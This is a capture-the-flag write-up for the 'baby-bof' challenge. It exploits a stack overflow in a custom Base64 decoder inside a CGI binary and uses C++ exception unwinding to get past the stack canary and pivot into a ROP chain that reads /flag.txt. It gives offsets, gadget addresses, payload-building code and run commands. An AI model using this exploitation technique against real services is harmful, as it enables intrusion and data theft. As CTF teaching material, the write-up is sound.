# baby-bof write-up

## TL;DR

The bug is an unbounded write in the custom Base64 decoder:

```cpp
char decoded[0x100];
decode_base64(basic_auth, decoded);
```

`decode_base64()` keeps writing decoded bytes into `decoded` but never checks the output length. A normal stack BOF would be enough, except the binary is compiled with `-fstack-protector-strong`, so returning normally will trip the stack canary.

The intended trick is to:

1. overflow `decoded` and overwrite the saved frame,
2. **then** trigger a `std::invalid_argument` inside `decode_base64()`,
3. let **C++ exception unwinding** use the corrupted frame,
4. pivot into a ROP chain stored in the overflowed stack buffer.

The ROP chain prints a valid CGI header, opens `/flag.txt`, reads it, writes it to stdout, and exits cleanly.

---

## Challenge overview

The service is a CGI binary behind `lighttpd`. It reads `/flag.txt`, then checks the `Authorization` header:

```cpp
bool validate_auth(char *authorization, const char *flag) {
    char *basic_auth = nullptr;
    char *supplied_username = nullptr;
    char *supplied_password = nullptr;
    char decoded[0x100];

    if (authorization == nullptr || std::strncmp(authorization, "Basic ", 6) != 0) {
        return false;
    }

    basic_auth = authorization + 6;
    decode_base64(basic_auth, decoded);

    char *colon_pos = std::strchr(decoded, ':');
    if (colon_pos == nullptr) {
        return false;
    }

    *colon_pos = '\0';
    supplied_username = decoded;
    supplied_password = colon_pos + 1;

    return std::strcmp(supplied_username, USERNAME) == 0 &&
           std::strcmp(supplied_password, flag) == 0;
}
```

The binary is built as:

```bash
g++ -std=c++17 -static -o /var/www/html/index.cgi -fstack-protector-strong -no-pie /tmp/index.cpp
```

So the important properties are:

- static binary
- no PIE
- stack canary enabled

No PIE is great for ROP because addresses are fixed. The canary is the main obstacle.

---

## Bug analysis

The decoder validates Base64 format, but it never validates the **decoded output length**:

```cpp
for (int j = 0; j < 3 - padding; j++) {
    output[output_index++] = (value >> (16 - j * 8)) & 0xff;
}
```

So if we send a very long Basic Auth string, decoded bytes keep flowing past `decoded[0x100]` and smash the stack.

### Why the naïve overflow fails

If we simply overwrite saved RIP and return, the function epilogue checks the stack canary and aborts before our controlled return happens.

So we need a path that avoids the normal canary-checking return.

---

## Core idea: overflow first, throw later

`decode_base64()` throws `std::invalid_argument` when it sees invalid Base64. That is exactly what we want.

The trick is to make the decoder:

- decode **all our attacker-controlled bytes first**, so the overflow is already done,
- and only **after that** hit an invalid character and throw an exception.

That is why the exploit does two things:

1. Base64-encodes the overflow payload itself.
2. Appends `@AAA` at the end.

`@` is not a valid Base64 character, so it throws. But because it is placed in a **new block after the real payload**, the stack is already corrupted before the exception happens.

We also make the raw payload length a multiple of 3 so the Base64 encoder does **not** emit `=` padding. That matters because the decoder is picky about padding and we want the overflow to complete cleanly before the throw.

---

## Stack layout used by the exploit

For the bundled build, the exploit uses these offsets:

- `decoded` starts at stack base
- saved `rbp` is at offset `0x110`
- saved `rip` is at offset `0x118`
- the ROP chain is placed from offset `0x158`

So the payload layout is roughly:

```text
[ decoded buffer / filler ]
[ fake saved rbp          ]   <- offset 0x110
[ fake saved rip          ]   <- offset 0x118
[ padding                 ]
[ ROP chain               ]   <- offset 0x158
```

The first bytes are set to `admin:` so that, if execution ever falls through normally, the decoded buffer still looks like a Basic Auth credential.

---

## Why exception unwinding helps

When `@` is processed, `decode_base64()` throws. Control does **not** go through the normal `validate_auth()` return path immediately. Instead, the runtime performs **C++ exception unwinding**.

The exploit overwrites the saved frame information so the unwinder eventually lands on a useful fixed address in the static binary and pivots onto our controlled stack data.

That is why the exploit script calls this value an `unwind_rip` instead of a normal return address.

For the challenge binary, the useful landing site is:

```text
0x4086e0
```

Because the binary is static and non-PIE, this address is stable for the Docker build.

---

## ROP chain

Once control is pivoted into our stack buffer, the ROP chain does four things.

### 1. Print a valid CGI header

If we only dump the flag bytes, `lighttpd` may answer with `500 Internal Server Error` because CGI output is expected to begin with headers.

So the chain first writes:

```text
Content-Type: text/plain

```

The exploit reuses the existing rodata string `"Content-Type: text/plain\n"` and writes one extra newline.

### 2. Open the flag

```c
open("/flag.txt", O_RDONLY)
```

### 3. Read it into `.bss`

```c
read(3, bss, 0x80)
```

### 4. Write it back to stdout and exit cleanly

```c
write(1, bss, 0x80)
_exit(0)
```

Exiting cleanly is important so the web server does not convert the response into another `500`.

---

## Important gadget/symbol addresses

For the local build, the script auto-extracted these values from `index.cgi`:

```text
pop_rdi      = 0x402514
pop_rsi      = 0x401cde
pop_rdx_rbx  = 0x482677
open         = 0x44dfe0
read         = 0x44e070
write        = 0x44e0b0
_exit        = 0x44d6f0
/flag.txt    = 0x490131
header str   = 0x4900fb
.bss buffer  = 0x4ca760
fake_rbp     = 0x4caf60
unwind_rip   = 0x4086e0
```

Because the binary is static and non-PIE, this is much nicer than a typical remote ROP problem.

---

## Payload construction

The exploit builds the raw decoded payload first:

```python
raw = bytearray(b"A" * OFF_ROP + rop_chain(c))
raw[:6] = b"admin:"
raw[OFF_SAVED_RBP:OFF_SAVED_RBP + 8] = p64(c.fake_rbp)
raw[OFF_SAVED_RIP:OFF_SAVED_RIP + 8] = p64(unwind_rip)
while len(raw) % 3:
    raw += b"P"
```

Then it turns that into Basic Auth:

```python
"Basic " + base64.b64encode(raw).decode() + "@AAA"
```

That final `@AAA` is what triggers the throw **after** the overflow finished.

---

## Local verification

I verified the exploit locally with the bundled fake flag.

Compile the challenge binary:

```bash
g++ -std=c++17 -static -o index.cgi -fstack-protector-strong -no-pie index.cpp
```

Because the CGI reads an absolute path, make sure `/flag.txt` exists locally as well:

```bash
sudo cp flag.txt /flag.txt
```

Then run:

```bash
python3 solve_baby_bof_v2.py --elf "$PWD/index.cgi" --local-cgi "$PWD/index.cgi" --verbose
```

Expected result:

```text
grey{fake_flag}
```

---

## Remote usage

From the challenge directory:

```bash
python3 solve_baby_bof_v2.py challs.nusgreyhats.org 32367 --docker-dir .
```

Or, if `index.cgi` is already built locally:

```bash
python3 solve_baby_bof_v2.py challs.nusgreyhats.org 32367 --elf ./index.cgi
```

---

## Final notes

This challenge looks like a normal stack BOF at first, but the canary blocks the usual direct return overwrite. The key observation is that the custom Base64 parser can both:

- write attacker-controlled bytes past the stack buffer, and
- throw a C++ exception after the overflow has already happened.

That turns the bug from a boring crash into a neat **exception-unwinding + ROP** exploit.

The full solve script used for this write-up is `solve_baby_bof_v2.py`.
